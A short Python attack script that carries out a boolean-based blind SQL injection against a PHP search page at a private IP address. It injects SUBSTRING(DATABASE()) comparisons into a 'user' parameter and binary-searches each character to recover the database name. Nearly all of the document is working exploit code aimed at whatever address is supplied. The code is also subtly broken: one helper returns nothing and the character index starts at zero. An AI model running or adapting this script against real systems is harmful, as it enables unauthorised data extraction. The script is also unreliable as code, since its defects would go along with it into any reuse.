import requests
import urllib.parse
import sys

# url = "http://192.168.1.3/demo/search.php"

def get_search_lt(idx, ch): 
    return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) > '{ch}"

def get_search_eq(idx, ch): 
    return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) = '{ch}"

search_eq = "alice' AND (SELECT DATABASE()) = '"

url_success = "http://192.168.1.3/demo/user.php"

def encode_url(url, param):
    params = {
        "user": param
    }

    encoded_params = urllib.parse.urlencode(params)
    final_url = f"{url}?{encoded_params}"
    return final_url

def is_succes(url):
    response = requests.get(url, timeout=5.0)
    print(response.url == url_success)
    return response.url == url_success


def lower(idx, ch, url: str):
    return is_succes(encode_url(url, get_search_lt(idx, ch)))

def eq_char(idx, ch, url: str):
    is_succes(encode_url(url, get_search_eq(idx, ch)))

def eq(name, url: str):
    return is_succes(encode_url(url, search_eq+name))


def binary_search_char(idx, alphabet, url: str):
    lo, hi = 0, len(alphabet) - 1

    while lo <= hi:
        mid = (lo + hi) // 2
        guess = alphabet[mid]
        print(guess)

        if eq_char(idx, guess, url):
            return guess
        elif lower(idx, guess, url):
            lo = mid + 1
        else:               
            hi = mid - 1
    print("none")
    return None


def guess_secret(url: str):
    alphabet = "".join(chr(i) for i in range(ord('a'), ord('z') + 1))
    name = ""
    idx = 0

    while True:
        if eq(name, url):
            return name
        print(idx)
        print(name)
        ch = binary_search_char(idx, alphabet, url)
        if ch is None:
            raise ValueError("Character not found in ASCII!")

        name += ch
        idx += 1

def main():
    if len(sys.argv) == 1:
        address = "192.168.1.3"
    else:
        address = sys.argv[1]
    url  = f"http://{address}/demo/search.php"
    print(f"Attacking url: {url}")
    print("Guessed:", guess_secret(url))
    pass

main()
